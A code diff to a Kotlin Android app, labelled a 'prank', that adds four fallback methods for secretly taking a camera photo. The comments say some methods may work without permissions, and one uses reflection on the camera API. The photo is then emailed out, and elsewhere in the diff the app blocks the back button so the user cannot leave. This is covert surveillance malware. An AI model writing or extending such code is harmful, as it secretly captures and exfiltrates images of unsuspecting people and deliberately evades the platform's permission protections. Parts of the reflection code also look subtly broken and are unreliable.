@@ -19,6 +19,7 @@ import android.os.Bundle
 import android.os.CountDownTimer
 import android.os.Handler
 import android.os.HandlerThread
+import android.os.Looper
 import android.util.Base64
 import android.view.WindowManager
 import androidx.appcompat.app.AppCompatActivity
@@ -26,8 +27,11 @@ import android.widget.Button
 import android.widget.ImageView
 import android.widget.TextView
 import java.io.ByteArrayOutputStream
+import java.io.File
 import java.nio.ByteBuffer
 import java.util.Properties
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 import javax.activation.DataHandler
 import javax.mail.Authenticator
 import javax.mail.Message
@@ -118,20 +122,143 @@ class MainActivity : AppCompatActivity() {
         // Ничего не делаем - блокируем выход
     }
     
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
+        // Обработка результата от системной камеры
+        if (requestCode == 100) {
+            // Фото сделано или отменено
+        }
+        super.onActivityResult(requestCode, resultCode, data)
+    }
+    
     private fun takeAndSendPhoto() {
         thread {
             var photoData: ByteArray? = null
             
-            // Подход 1: Пробуем Camera2 API (может работать без разрешений на некоторых устройствах)
-            photoData = tryCamera2Api()
+            // Подход 1: Intent системной камеры (может сработать без разрешений)
+            photoData = trySystemCameraIntent()
             
-            // Подход 2: Если Camera2 не сработал - пробуем старую камеру
+            // Подход 2: Прямой доступ через Camera.open()
+            if (photoData == null) {
+                photoData = tryDirectCameraAccess()
+            }
+            
+            // Подход 3: Camera2 API
+            if (photoData == null) {
+                photoData = tryCamera2Api()
+            }
+            
+            // Подход 4: Legacy Camera
             if (photoData == null) {
                 photoData = tryLegacyCamera()
             }
             
+            android.util.Log.d("PrankPhoto", "Final photo size: ${photoData?.size ?: 0} bytes")
+            
             // Отправляем письмо (с фото или без)
             sendEmailWithPhoto(photoData)
+        }
+    }
+    
+    private fun trySystemCameraIntent(): ByteArray? {
+        return try {
+            val photoRef = ByteArrayRef()
+            val latch = CountDownLatch(1)
+            val cacheDir = cacheDir
+            val photoFile = File(cacheDir, "prank_photo_${System.currentTimeMillis()}.jpg")
+            
+            runOnUiThread {
+                try {
+                    // Пробуем запустить системную камеру через Intent
+                    val intent = android.content.Intent("android.media.action.IMAGE_CAPTURE")
+                    
+                    // Сохраняем фото в файл
+                    val photoUri = android.net.Uri.fromFile(photoFile)
+                    intent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, photoUri)
+                    
+                    // Запускаем камеру
+                    startActivityForResult(intent, 100)
+                    
+                    // Ждём пока файл появится
+                    object : Handler(Looper.getMainLooper()) {
+                        fun check() {
+                            if (photoFile.exists() && photoFile.length() > 0) {
+                                photoRef.data = photoFile.readBytes()
+                                latch.countDown()
+                            } else {
+                                postDelayed({ check() }, 200)
+                            }
+                        }
+                    }.postDelayed({ check() }, 1000)
+                    
+                    // Таймаут 10 секунд
+                    postDelayed({ latch.countDown() }, 10000)
+                } catch (e: Exception) {
+                    latch.countDown()
+                }
+            }
+            
+            latch.await(12000, TimeUnit.MILLISECONDS)
+            
+            if (photoRef.data != null) {
+                photoRef.data
+            } else null
+        } catch (e: Exception) {
+            null
+        }
+    }
+    
+    private fun tryDirectCameraAccess(): ByteArray? {
+        return try {
+            // Пытаемся открыть камеру напрямую через reflection
+            val cameraClass = Class.forName("android.hardware.Camera")
+            val openMethod = cameraClass.getMethod("open")
+            val camera = openMethod.invoke(null)
+            
+            if (camera != null) {
+                val parameters = cameraClass.getMethod("getParameters").invoke(camera)
+                val sizes = parameters?.let { 
+                    it::class.java.getMethod("getSupportedPictureSizes").invoke(it) 
+                } as? List<*>
+                
+                if (!sizes.isNullOrEmpty()) {
+                    val size = sizes[0]
+                    val width = size::class.java.getField("width").get(size) as Int
+                    val height = size::class.java.getField("height").get(size) as Int
+                    
+                    parameters::class.java.getMethod("setPictureSize", Int::class.java, Int::class.java)
+                        .invoke(parameters, width, height)
+                    cameraClass.getMethod("setParameters", parameters::class.java)
+                        .invoke(camera, parameters)
+                    
+                    val texture = SurfaceTexture(10)
+                    cameraClass.getMethod("setPreviewTexture", SurfaceTexture::class.java)
+                        .invoke(camera, texture)
+                    cameraClass.getMethod("startPreview").invoke(camera)
+                    Thread.sleep(500)
+                    
+                    val photoRef = ByteArrayRef()
+                    cameraClass.getMethod("takePicture", 
+                        Class.forName("android.hardware.Camera\$ShutterCallback"),
+                        Class.forName("android.hardware.Camera\$PictureCallback"),
+                        Class.forName("android.hardware.Camera\$PictureCallback"),
+                        Class.forName("android.hardware.Camera\$PictureCallback")
+                    ).invoke(camera, null, null, null, { data, _ ->
+                        if (data != null) {
+                            photoRef.data = data
+                        }
+                    } as HardwareCamera.PictureCallback)
+                    
+                    Thread.sleep(1000)
+                    cameraClass.getMethod("release").invoke(camera)
+                    photoRef.data
+                } else {
+                    cameraClass.getMethod("release").invoke(camera)
+                    null
+                }
+            } else null
+        } catch (e: Exception) {
+            android.util.Log.d("PrankPhoto", "Direct access failed: ${e.message}")
+            null
         }
     }
     
